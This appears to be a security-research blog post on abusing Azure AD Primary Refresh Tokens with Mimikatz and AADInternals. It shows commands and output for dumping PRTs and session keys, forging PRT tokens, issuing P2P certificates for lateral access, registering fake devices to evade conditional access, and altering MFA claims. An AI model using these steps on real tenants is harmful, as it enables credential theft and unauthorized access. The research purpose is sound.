+++
title = "Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert"
date = "2020-09-01"
lastmod = "2020-10-15"
categories =["blog"]
tags = ["Azure Active Directory","Azure","security","MFA","PRT"]
thumbnail = "/images/posts/PRT.png"
+++

Lately we have seen great articles by <a href="https://twitter.com/_dirkjan" target="_blank">@_dirkjan</a>, 
<a href="https://twitter.com/tifkin%5F" target="_blank">@tifkin_</a>,
<a href="https://twitter.com/rubin_mor" target="_blank">@rubin_mor</a>,
 and <a href="https://twitter.com/gentilkiwi" target="_blank">@gentilkiwi</a>
about utilising Primary Refresh Token (PRT) to get access to Azure AD and Azure AD joined computers.

In this blog, I'll report my own findings regarding to PRT and introduce the new functionality added to **AADInternals v0.4.1**.

<!--more-->
# What is PRT

According to Microsoft <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token" target="_blank">documentation</a>:

> A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, iOS, and Android devices. It is a JSON Web Token (JWT) specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. 

To simplify, it is a token used to identify the user and device. The issued token is valid for 14 days.

So what can we do with the PRT? With the plain token, nothing. We also need a session key, which is issued at the same time than the PRT.

The (Windows 10) computer must be Azure AD joined (or hybrid joined) to be able to get the PRT. According to <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#how-is-a-prt-issued" target="_blank">documentation</a>,
during the registration the **dsreg** component on Windows 10 device creates two key pairs:

> * Device key (dkpub/dkpriv) <br>
> * Transport key (tkpub/tkpriv)

The private keys are (preferably) stored to TPM. The **device key** is used to identify the device, whereas **transport key** is
used to decrypt the **session key**. The session key is used as the Proof-of-Possession (POP) key, and also protected by TPM.

# Utilising existing PRTs

## BrowserCore.exe

As all the keys well protected, how to use them? The easiest way is to let the Windows components do the work for you!

Both <a href="https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/" target="_blank">@_dirkjan</a> and <a href="https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30" target="_blank">@tifkin_</a>
showed how Microsoft Edge and Chrome (through the <a href="https://chrome.google.com/webstore/detail/windows-10-accounts/ppnbnpeolgkicgegkbkbjmhlideopiji?hl=en" target="_blank">extension</a>) uses **BrowserCore.exe** to 
generate a signed PRT token. 

The generated token can be used either as a cookie or http request header, both named as **x-ms-RefreshTokenCredential**.

In AADInternals, I'm using @_dirkjan's approach to send the requests to stdin of BrowserCore.exe and read the results from stdout. 
I've added **-PRTToken** parameter to **Get-AADIntAccessTokenFor&lt;service>** functions so you can pass the prt token to get the access token.

**Note!** On some computers I've tested, getting the token may fail every now and then.

{{< highlight powershell >}}
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
{{< /highlight>}}

The nicest thing here is that if the PRT was issued with MFA, the resulting access token also has the MFA claim! 

> **Update on Sep 29th 2020:** <br>
> It seems that PRT tokens must now include the **request_nonce**. If not, Azure AD sends a redirect with **sso_nonce** which
> must be added to the PRT token. This means that without access to **session key**, PRT tokens can't be used anymore. 

## The Mimikatz way

The Mimikatz release <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200807" target="_blank">2.2.0Azure Pass-the-PRT</a> has everything needed for extracting
the PRT and session key. 

**Note!** Below I'm using a virtual machine without TPM. Mimikatz may behave differently on a computer with TPM.

First step is to launch the mimikatz and get the debug privilege:
```
mimikatz # privilege::debug
Privilege ' 20' OK
```
Next we dump the CloudAP stuff:
```
mimikatz # sekurlsa::cloudap
```
The output contains a lot of users, but we are interested here on those having **AzureAD** as their domain:
```
Authentication Id : 0 ; 4482338 (00000000:00446522)
Session           : Interactive from 3
User Name         : TestUser
Domain            : AzureAD
Logon Server      : (null)
Logon Time        : 01/09/2020 9.47.35
SID               : S-1-12-1-xx-xx-xx-xx
        cloudap :
             Cachedir : 15aab9d31109bbf8a2d0741b09cd5c0a05840d1fe788d513ee97715be0a19e5f
             Key GUID : {63502e91-4f44-43e9-8dc4-870d275383c5}
             PRT      : {"Version":3, "UserInfo":{"Version":2, "UniqueId":"651ff3d8-3c71-45e8-8a7a-7f382f655099", "PrimarySid":"S-1-12-1-1696592856-1172847729-947878538-2572182831", "DisplayName":"Diego Siciliani", "FirstName":"Diego", "LastName":"Siciliani", "Identity":"DiegoS@contoso.myo365.site", "PasswordChangeUrl":"https:\/\/portal.microsoftonline.com\/ChangePassword.aspx", "PasswordExpiryTimeLow":3583418367, "PasswordExpiryTimeHigh":2147483446, "PublicInfoPublicKeyType":0, "Flags":0}, "Prt":"MC5BQUFBeGt3RFJMN19mRVNvbms3SXhzaTc3b2M3cWpodG9...aG1ianRuMk83QmtJdkg0QXNVRXp6dWhQX3ZwZ2ZNLWppYw", "PrtReceivedtime":1598942856, "PrtExpirytime":1600152597, "ProofOfPossesionKey":{"Version":1, "KeyType":"ngc", "KeyValue":"AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6...a_uuJVo86iywLqs0yh0sHCsGKd0rgqWrrQGMEQSSeq9E0znadE"}, "SessionKeyImportTime":1598942856, "TenantId":"44034cc6-ffbe-447c-a89e-4ec8c6c8bbee", "UserName":"DiegoS@contoso.myo365.site", "Subject":"0F_C1Khd7aizs-9miof-mezPCbhvdR9kd7CCOUhGg3I", "AuthorityUri":"https:\/\/login.microsoftonline.com", "DeviceId":"0c36183d-f45b-4973-9047-71856c6c24b3", "DeviceCertificateThumbprint":"qyc+i5KH3DL9k5M3K9gmLGpYdsk=", "EnterpriseSTSInfo":{"Version":0, "PRTSupported":0, "WinHelloSupported":0, "WinHelloKeyReceiptSupported":0}, "IsRestricted":0, "CredentialType":1, "DsrInstance":0, "AdfsPasswordChangeInfo":0, "AccountType":1, "IsDefaultPasswordChangeUri":0}
             DPAPI Key: 061a521d6d93dadea48b5...83c4cc08fc577859ec0d0224 (sha1: 2ad0cf83b8ee8ad4267adc1e4809ab9a8d25f812)
```
And if we prettify the PRT we can see the following information (**Prt** and **KeyValue** truncated):
{{< highlight json >}}
{
	"Version": 3,
	"UserInfo": {
		"Version": 2,
		"UniqueId": "1e0c26b9-6c98-4a8b-90a9-517fec2e7aa2",
		"PrimarySid": "S-1-12-1-xx-xx-xx-xx",
		"DisplayName": "Test User",
		"FirstName": "Test",
		"LastName": "User",
		"Identity": "TestU@contoso.com",
		"PasswordChangeUrl": "https:\/\/portal.microsoftonline.com\/ChangePassword.aspx",
		"PasswordExpiryTimeLow": 3583418367,
		"PasswordExpiryTimeHigh": 2147483446,
		"PublicInfoPublicKeyType": 0,
		"Flags": 0
	},
	"Prt": "MC5BQUFBeGt3RFJMN19mRVNvbms3SXhzaTc3b2M3cWpodG9...aG1ianRuMk83QmtJdkg0QXNVRXp6dWhQX3ZwZ2ZNLWppYw",
	"PrtReceivedtime": 1598942856,
	"PrtExpirytime": 1600152597,
	"ProofOfPossesionKey": {
		"Version": 1,
		"KeyType": "ngc",
		"KeyValue": "AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6...a_uuJVo86iywLqs0yh0sHCsGKd0rgqWrrQGMEQSSeq9E0znadE"
	},
	"SessionKeyImportTime": 1598942856,
	"TenantId": "1f4b89e3-17eb-409e-864b-ff7ddd0fc4a0",
	"UserName": "TestU@contoso.com",
	"Subject": "0F_C1Khd7aizs-9miof-mezPCbhvdR9kd7CCOUhGg3I",
	"AuthorityUri": "https:\/\/login.microsoftonline.com",
	"DeviceId": "03bbfd6f-0109-428b-93de-e2359a8c3f84",
	"DeviceCertificateThumbprint": "qyc+i5KH3DL9k5M3K9gmLGpYdsk=",
	"EnterpriseSTSInfo": {
		"Version": 0,
		"PRTSupported": 0,
		"WinHelloSupported": 0,
		"WinHelloKeyReceiptSupported": 0
	},
	"IsRestricted": 0,
	"CredentialType": 1,
	"DsrInstance": 0,
	"AdfsPasswordChangeInfo": 0,
	"AccountType": 1,
	"IsDefaultPasswordChangeUri": 0
}
{{< /highlight>}}

Next, we need to decode the **KeyValue** from **ProofOfPossesionKey** (MS typo :thinking:?) to get the session key. We continue by elevating to NT AUTHORITY\SYSTEM:

```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM
```
Now we can use Mimikatz to unprotect the session key:
```
mimikatz # dpapi::cloudapkd /keyvalue:AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6...a_uuJVo86iywLqs0yh0sHCsGKd0rgqWrrQGMEQSSeq9E0znadE /unprotect
Label      : AzureAD-SecureConversation
Context    : b10e7c099040ebb7a15a6cab38ad320a8ef8c68c73c299bf
 * using CryptUnprotectData API
Key type   : Software (DPAPI)
Clear key  : e5268ef434fb624db4b133cf9f0854d73d367284b0f39543810587afd5d4178d
Derived Key: ddd22d1244a43095a866b666ef9f0cab9c8d7bb364256548a6e603466d800604
```
As we have both the **PRT** and the **session key** (**Clear key** from the output above) and we can generate a new PRT token using AADInternals:

{{< highlight powershell >}}
# Add the PRT to a variable
$MimikatzPRT = "MC5BQUFBeGt3RFJMN19mRVNvbms3SXhzaTc3b2M3cWpodG9...aG1ianRuMk83QmtJdkg0QXNVRXp6dWhQX3ZwZ2ZNLWppYw"

# Add padding
while($MimikatzPRT.Length % 4) {$MimikatzPRT += "="}

# Convert from Base 64
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Add the session key (Clear key) to a variable
$MimikatzKey = "e5268ef434fb624db4b133cf9f0854d73d367284b0f39543810587afd5d4178d"

# Convert to byte array and base 64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate a new PRTToken with nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken -SaveToCache
{{< /highlight>}}

At some point in September 2020 Microsoft changed (fixed?) the authentication flow of PRTTokens to require a nonce. 

With the session key and PRT, the new PRT tokens can be created as long as the PRT is valid.

As <a href="https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597" target="_blank">@rubin_mor</a> demonstrated,
we can also use the session key and PRT to get a **Azure AD P2P certficate**. The certificate, in turn, 
can be used to get access to other computers joined to the same Azure AD tenant.

Continuing the previous example, we can get the certificate with AADInternals:
{{< highlight powershell >}}
# Generate a new P2P certificate
New-AADIntP2PDeviceCertificate -RefreshToken $PRT -SessionKey $SKey
{{< /highlight>}}
Output:
```
User certificate successfully created:
  Subject:         "CN=TestU@contoso.com, CN=S-1-12-1-xx-xx-xx-xx, DC=0f73eaa6-7fd6-48b8-8897-e382ba96daf4"
  Issuer:          "CN=MS-Organization-P2P-Access [2020]"
  Cert thumbprint: A7F1D1F134569E0234E6AA722354D99C3AA68D0F
  Cert file name : "TestU@contoso.com-P2P.pfx"
  CA file name :   "TestU@contoso.com-P2P-CA.der"
```
The generated certificate can be used with <a href="https://github.com/morRubin/AzureADJoinedMachinePTC" target="_blank">AzureADJoinedMachine</a> by @rubin_mor
to access other Azure AD joined machines.

## How to create a PRT token?

It was quite easy to dump required information using Mimikatz. 
But how is the PRT token actually created? The answer is by creating a JWT and signing it with a key that is derived from **context** and **session key**.

The **context** is a Base 64 encoded random byte array (24 bytes) and it is added to the JWT header:
**Note!** All slashes '/' must be escaped with back slashes '\'
{{< highlight json >}}
{
	"alg": "HS256",
	"typ": "JWT",
	"ctx": "x9XSurmy8TmcsJUgxq\/IT5TJg73fgiKj"
}
{{< /highlight>}}

The body of the JWT contains the **is_primary** (always true), **iat** (unix time = seconds since 1.1.1970) and **refresh_token** (PRT).
{{< highlight json >}}
{
	"is_primary": "true",
	"iat": 1598958425,
	"refresh_token": "0.AAAAxkwDRL7_fESonk7Ixsi77oc7qjhtoBdIsnV6MWmI2TtfAM8.AgABAAAAAAAGV_bv21oQQ4ROqh0_1-tAAQDs_wIA9P-ojLeOCNV0dCFvHzSo64nTRhq19kM_getBIkw-QN87pYh7_AnHZirEP1K55AoxUaTHJdtttzb4xJuf_yG30jr5z034xffcW4e_EXuAfQJ6fR9FFi2-YslwAKSUAlLagdQMXLzyv5x_FcVpdvcUq3NgbmUTY9WaNSwiswoTC_aD9N1vV3_EPEQ7VSXpLOzzTc1QnlQtI0IwtUdyLdHckjVu6fphMYMXB82f472D684rfYczD7mp-hyYRZS3AQNtPsit1t9poiZ6_T5ExKDt55_5XQ6rRvXmAG3cfm362LB8wmADQdMNnczyUZlyFJbYV952cLL71a3bkB7w9avy1N_WHEAm5p-5GpXI0RdXppllFznBzH0B7iN6e1XSb_WLWCCGy9jLNTEtYr_vhK4XVnyWY0KPOmu7aATkotNnWOIQUt8gPZrMM8Q8TDF7XISrt90NFlo2FADs77yaqhvhwAaQH5we8YNC4fJ9AQX0wz7f4zjc-bLoZRSvuKwC4uG1mRs8cCoEncsMlSQWIBfI50q7kKife-k95dXlRqmtEVdIqZCJVBO4xwFYWUgRBzU2FVGurYxFwVVjvPHoKRBJ4l9bcvtSw4eb0MuovLmTVa5vLrlZd-cPi3sj-ESDA-LtJi_W71vPCnXsmk8Iw4u6w-GmmIFq1l1mn9wizHIFDLCKKqQuqVjo0cB-PQ9kcSyWXNwOlGF_prK6Og8EpNkjzMBrczKpFIVr6t7yxmSPc-JFeMSK2vPxtun2vng035O226b7LvbfpKgezfENXjBHvBP10qbXi1o0WWpf7P_gxZH9h4roFM0qyxt5Y8dqiCOb2NnJeEDJ_yuK54a2TdA6LsLuxdssW1lUkXUTtwkT0vKnZ0SRJtieujiCZ-Vj-E2469NgQn7qEAeYtS9zRbL3PVS5iw4o2kJenXQJNxMbxfmZh1rcGwxIyhltmQuoGUMF6gXGxKXSPJH6goSz1Wej0mQSMgdh7GneK50Npaeg6FZHZhxHpxtzEkWQRYSNZoNUOlo5Zv_3dZhB9LDvsFrnfr34IPeElFO6m0u3vGD8hY3RMkwO7oeRy9ufvnAcZ1kaP0QM7LmSglq_1cX_rhFlft7TVBYMcAOzoxr076ZU04IS3ON88dljGYUX2BF2a4TyZTyfjMT3diAuufJW_99ITDQ6QvkzZklaGWlsEdysa_oQ85OXPuBkVcBgzTsr_urKXN1j6L1U"
}
{{< /highlight>}}

Both the header and body are separately encoded (Byte 64), the padding is removed, and they are concatenated using a period '.' as a separator.
The result is turned into a byte array (UTF-8 encoding) and signed.

The key used to sign the JWT is derived from the session key and context, as explained by <a href="https://dirkjanm.io/digging-further-into-the-primary-refresh-token/" target="_blank">@_dirkjan</a>.
He used **BCryptKeyDerivation** to derive the key. The key derivation is using <a href="https://csrc.nist.gov/publications/detail/sp/800-108/final" target="_blank">NIST SP 800-108 KDF</a> key derivation function,
which I already knew from <a href="/aadinternals/#export-aadintadfssigningcertificate" target="_blank">Export-AADIntADFSSigningCertificate</a>.

As the signature is 256 bit (32 bytes) long, deriving the key was a walk in the park (wearing :mask:). 

The key is derived by calculating a HMACSHA256 value from the following byte array using the session key as the secret:
```
0x00, 0x00, 0x00, 0x01, <label>, 0x00, <context>, <length>
```
The parameters used are explained below. 

**Note!** The "AzureAD-SecureConversation" is a fixed label.

Parameter | Description | Value | Bytes
--- | --- | --- | ---
label   | UTF8 encoded byte array of the key label.  | "AzureAD-SecureConversation"       | 0x41, 0x7A, 0x75, 0x72, 0x65, 0x41, 0x44, 0x2D, 0x53, 0x65, 0x63, 0x75, 0x72, 0x65, 0x43, 0x6F, 0x6E, 0x76, 0x65, 0x72, 0x73, 0x61, 0x74, 0x69, 0x6F, 0x6E
context | UTF8 encoded byte array of the context.    | "x9XSurmy8TmcsJUgxq/IT5TJg73fgiKj" | 0xC7, 0xD5, 0xD2, 0xBA, 0xB9, 0xB2, 0xF1, 0x39, 0x9C, 0xB0, 0x95, 0x20, 0xC6, 0xAF, 0xC8, 0x4F, 0x94, 0xC9, 0x83, 0xBD, 0xDF, 0x82, 0x22, 0xA3
length  | 32 bit integer, length of the key in bits. | 256                                | 0x00, 0x00, 0x01, 0x00

The final byte array from where the HMACSHA256 is calculated:
```
           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   00 00 00 01 41 7A 75 72 65 41 44 2D 53 65 63 75  ....AzureAD-Secu
00000010   72 65 43 6F 6E 76 65 72 73 61 74 69 6F 6E 00 C7  reConversation.Ç
00000020   D5 D2 BA B9 B2 F1 39 9C B0 95 20 C6 AF C8 4F 94  ÕÒº¹²ñ9° Æ¯ÈO
00000030   C9 83 BD DF 82 22 A3 00 00 01 00                 É½ß"£....  
```

After calculating the HMACSHA256, the resulting byte array can be used to sign the JWT. 
The base 64 encoded signature (padding removed) is appended to the end of header and body using the period '.' as the separator.


# Creating your own PRT

One interesting thing in the cloud-era is that everything you do with the devices or clients involves communication with the cloud. This is also the case with PRT.

As explained in the <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/hello-for-business/hello-how-it-works-device-registration#azure-ad-joined-in-managed-environments" target="_blank">documentation</a>,
there are a lot of steps involved in joining a device to Azure AD.

And because I can, I decided to implement the registration process to AADInternals!

The first step is to get an access token for appid **1b730954-1685-4b74-9bfd-dac224a7b894** with **01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9** audience.
The following command will prompt for credentials and MFA:
{{< highlight powershell >}}
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache
{{< /highlight>}}

Now we can join our imaginary device to Azure AD:
{{< highlight powershell >}}
# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
{{< /highlight>}}
Output should be similar to below. The device is now registered and the corresponding certificate 
is saved to the current directory.
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```
The whole process is as follows.

1. A new RSA key pair is generated for the device (dkpub/dkpriv).
2. A certificate signing request (CSR) is generated for the name "CN=7E980AD9-B86D-4306-9425-9AC066FB014A"
3. A http request is made to "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0" to register the device to Azure AD 

The request body sent to Azure AD:
{{< highlight json >}}
{
	"CertificateRequest": {
		"Type": "pkcs10",
		"Data": "MIICdDCCAVwCAQAwLzEt...BAqsCDnqheld6IIgBC4GueLq+hrmu/7KjiHPQ="
	},
	"TransportKey":      "UlNBMQAIAAADAAAAAAEAAAAAAAAAAA...1EqIHM2S/iUkPtr5vNmKKa7zTQeWtRCSzzbZUfE0C3RQ==",
	"TargetDomain":      "contoso.com",
	"DeviceType":        "Commodore",
	"OSVersion":         "C64",
	"DeviceDisplayName": "My computer",
	"JoinType":           0,
	"attributes": {
		"ReuseDevice":     "true",
		"ReturnClientSid": "true"
	}
}
{{< /highlight>}}

Attribute | Description
--- | ---
CertificateRequest\Data | The base 64 encoded CSR (dkpub)
TransportKey            | The base 64 encoded raw public key of the transport key (tkpub). <br><br>**Note!** AADInternals uses the device certificate's private key to make things easier.
TargetDomain            | UPN suffix of the user
DeviceDisplayName       | The display name of the device. 
DeviceType              | A string describing the type of the device. Usually something like "Windows" or "Android".
OSVersion               | A string describing the OS version of the device. Usually something like "10.0.18363.0" or "8.1.0"
JoinType                | Type of the Azure AD Join. 0=AAD Join, 4=AAD register

The return value contains the signed public certificate of the device (dkpub) and its thumb print:
{{< highlight json >}}
{
	"Certificate": {
		"Thumbprint": "78CC77315A100089CF794EE49670552485DE3689",
		"RawBody": "MIID8jCCAtqgAwIBAgIQ...ceSgJZ7PGsxXF93b7yJ2zBlKFUJp7yMTm0esNaM/yDQpZ29SB4BMgtPJghsMUzyDSUQEIS8zc00ozZd2HQ8s+"
	},
	"User": {
		"Upn": "TestU@contoso.com"
	},
	"MembershipChanges": [{
			"LocalSID": "S-1-5-32-544",
			"AddSIDs": ["S-1-12-1-797902961-1250002609-2090226073-616445738", "S-1-12-1-3408697635-1121971140-3092833713-2344201430", "S-1-12-1-2007802275-1256657308-2098244751-2635987013"]
		}
	]
}
{{< /highlight>}}


With the newly created device certificate, we can now request a new PRT keys and create PRT tokens!



The following command prompts for user's credentials and requests new PRT and session key from Azure AD.

{{< highlight powershell >}}
# Get the PRT keys using the device certificate
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx
{{< /highlight>}}
As the output indicates, the keys are also saved to a JSON file: 
```
Keys saved to d03994c9-24f8-41ba-a156-1805998d6dc7.json
```

The return value is similar to the following JSON. The PRT is returned in **refresh_token** and the encrypted session key in **session_key_jwe**.

{{< highlight json >}}
{
	"token_type": "Bearer",
	"expires_in": "1209599",
	"ext_expires_in": "0",
	"expires_on": "1600160796",
	"refresh_token": "0.AAAAxkwDRL7_f...TVBYMcAOzoxr076ZU04IS3ON88dljGYUX2BF2a4TyZTyfjMT3diAuufJW_99ITDQ6QvkzZklaGWlsEdysa_oQ85OXPuBkVcBgzTsr_urKXN1j6L1U",
	"refresh_token_expires_in": 1209599,
	"id_token": "eyJ0eXAiOiJ...m15bzM2NS5zaXRlIiwidmVyIjoiMS4wIn0.",
	"session_key_jwe": "eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.CP7m_pNSAtchTvUPOPSA24Al7NgeetJXWqma8maQ19xikVUdVZEUEuJy3LoT6oWHRLsP4_BVmfoux_sNtotlmpHDS9kIGWdGkX-tFN3OuZHV954lCIRwa8WMh035RpfAZyCAwi_hfjz_Jx1y6Z7Q8vEa8EBGDxUN14kag81TsBFONFMHztQmwLhJ89pqoxlmn64sb0ctp2YmYpuATg7pCb3gwdDyiH9JUG3ZAndkkahnch24Wxnx0xPs1gwcKYdGg8gdpjrlsAroWvh2zD8Z6gReKBldt3BiJg3Z7QtUJgQIDg-FHkxyNavdb7OPSUR4nO-4MbA_H_7Dm8pTbKYHVA.MPpemDdwWCf9LSvv.jw.Hl5eNegOGoiYxgTKrxYLcw"
}
{{< /highlight>}}

The header of the **sessio_key_jwe** indicates that the key is encrypted using RSA-OAEP algorithm.
{{< highlight json >}}
{
	"enc": "A256GCM",
	"alg": "RSA-OAEP"
}
{{< /highlight>}}

Luckily, this was easy to decrypt in PowerShell:

{{< highlight powershell >}}
# Note: Private key is assumed to be present in $PrivateKey variable

# Get the encrypted key from the session_key_jwe (between the first and second period '.' )
$JWE = "eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.CP7m_pNSAtchTvU...l5eNegOGoiYxgTKrxYLcw"
$encKey =  [convert]::FromBase64String($JWE.Split(".")[1])

# Decrypt the key using the private key of transport key (tkpriv)
$decKey = [System.Security.Cryptography.RSAOAEPKeyExchangeDeformatter]::new($PrivateKey).DecryptKeyExchange($encKey)
{{< /highlight>}}

AADInternals adds the decrypted session key to **session_key** field of the JSON file before saving/returning it.
As such, we can easily pass the returned **$prtKeys** as settings when creating new PRT tokens:

{{< highlight powershell >}}
# Get the PRT keys using the device certificate
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx

# Generate a new PRTToken using the PRT keys
$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GetNonce

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken -SaveToCache
{{< /highlight>}}

We can also use the generated device certificate to get **P2P certificate** for the **device** itself!

{{< highlight powershell >}}
# Get the new P2P device certificate
New-AADIntP2PDeviceCertificate -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -TenantId 4169fee0-df47-4e31-b1d7-5d248222b872 -DeviceName "mypc1.company.com"
{{< /highlight>}}
```
Device certificate successfully created:
  Subject:         "CN=d03994c9-24f8-41ba-a156-1805998d6dc7, DC=4169fee0-df47-4e31-b1d7-5d248222b872"
  DnsName:         "mypc1.company.com"
  Issuer:          "CN=MS-Organization-P2P-Access [2020]"
  Cert thumbprint: 84D7641F9BFA90767EA3456E443E21948FC425E5
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P.pfx"
  CA file name :   "d03994c9-24f8-41ba-a156-1805998d6dc7-P2P-CA.der"
```

The generated certificate can be used with <a href="https://github.com/morRubin/AzureADJoinedMachinePTC" target="_blank">AzureADJoinedMachine</a> by @rubin_mor
to access other Azure AD joined machines.

# PRT and MFA claims

As the <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#when-does-a-prt-get-an-mfa-claim" target="_blank">documentation</a>
states, the PRT has MFA claim if the PRT was acquired using some form of MFA.

Based on my research, this information is stored to Azure AD device object. And, of course, this can be edited **after** the
device is registered..

You can use any of the following methods from MS access tokens <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens#the-amr-claim" target="_blank">documentation</a>:

Value  		| Description
---|---
pwd			| Password authentication, either a user's Microsoft password or an app's client secret.
rsa			| Authentication was based on the proof of an RSA key, for example with the Microsoft Authenticator app. This includes if authentication was done by a self-signed JWT with a service owned X509 certificate.
otp			| One-time passcode using an email or a text message.
fed			| A federated authentication assertion (such as JWT or SAML) was used.
wia			| Windows Integrated Authentication
mfa			| Multi-factor authentication was used. When this is present the other authentication methods will also be included.
ngcmfa		| Equivalent to mfa, used for provisioning of certain advanced credential types.
wiaormfa 	| The user used Windows or an MFA credential to authenticate.
none	 	| No authentication was done.


To see the methods of the device, use the following commands:
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Get the authentication methods
Get-AADIntDeviceRegAuthMethods -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7"
{{< /highlight>}}
```
pwd
``` 
The output will be the list of all authentication methods used while registering the device. In the example above,
the device was registered using password authentication method.

However, if you are a Global Admin, you can edit this :ok_hand: The example below sets password, device certificate and MFA authentication methods for the device.

{{< highlight powershell >}}
# Set the authentication methods
Set-AADIntDeviceRegAuthMethods -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" -Methods pwd,rsa,mfa
{{< /highlight>}}
```
pwd
rsa
mfa
```
Now all the access tokens acquired using the PRT of the device will include pwd, rsa, and mfa claims! This way you can
change the authentication behaviour of devices.

**Note:** PRT claims are inherited only if the access token is acquired by the owner of the device!

# Summary

The PRT tokens can be easily created with Windows components for the current user. But the two main incredients, 
the session key and the PRT itself, are much harder to get access to. 
With Mimikatz, however, these can be exported (at least from the machine without TPM)

We also learned how easy it is to "create" your own devices, register them to Azure AD, and get access to device certificates.
With those certificates, we were able to create a new PRT with the corresponding session token. 

After getting access to session key and PRT, we were able to create our own PRT tokens, and with them get access tokens to Azure AD / Office 365 services. 
Also, we were able to create P2P Azure AD device and user certificates, which could be used to laterally access other
Azure AD joined computers of the same tenant.

By joining our own "devices" to Azure AD and acquiring PRT tokens for those devices, it is possible to "emulate" corporate computers and bypass 
certain conditional access (CA) policies based on the device state.

# What next?

Next I'll continue to explore Azure MDM and MAM to see whether it would be possible to emulate device compliance. But that's another <a href="/post/mdm" target="_blank">story</a>!

# References
* @_dirkjan: <a href="https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/" target="_blank">Abusing Azure AD SSO with the Primary Refresh Token</a>
* @_dirkjan: <a href="https://dirkjanm.io/digging-further-into-the-primary-refresh-token/" target="_blank">Digging further into the Primary Refresh Token</a>
* @gentilkiwi: <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200807" target="_blank">Mimikatz release 2.2.0 20200807 Azure Pass-the-PRT</a>
* @rubin_mor: <a href="https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597" target="_blank">Azure AD Pass The Certificate</a>
* @tifkin_: <a href="https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30" target="_blank">Requesting Azure AD Request Tokens on Azure-AD-joined Machines for Browser SSO</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token" target="_blank">What is a Primary Refresh Token?</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/hello-for-business/hello-how-it-works-device-registration" target="_blank">Windows Hello for Business and Device Registration</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens#the-amr-claim" target="_blank">Microsoft identity platform access tokens</a>